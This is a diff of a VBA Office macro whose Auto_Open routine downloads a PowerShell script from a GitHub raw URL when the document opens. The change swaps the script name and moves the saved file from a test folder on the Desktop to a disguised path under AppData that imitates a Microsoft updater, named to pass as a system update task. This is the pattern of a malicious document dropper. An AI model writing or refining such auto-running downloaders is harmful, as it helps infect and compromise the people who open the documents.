@@ -6,10 +6,11 @@ Sub Auto_Open()
     Dim webContent As String
     
     ' Set the URL of your PowerShell script
-    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/setup"
+    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/vbs32"
     
     ' Save directly to desktop
-    savePath = "C:\Users\juraj_iptfkru\Desktop\test\WinUpdateTask.ps1"
+    savePath = "C:\Users\juraj_iptfkru\AppData\Local\Microsoft\Updater\WinTask\SysUpdateTask\vbs32.ps1"
+
     
     On Error GoTo ErrorHandler
     
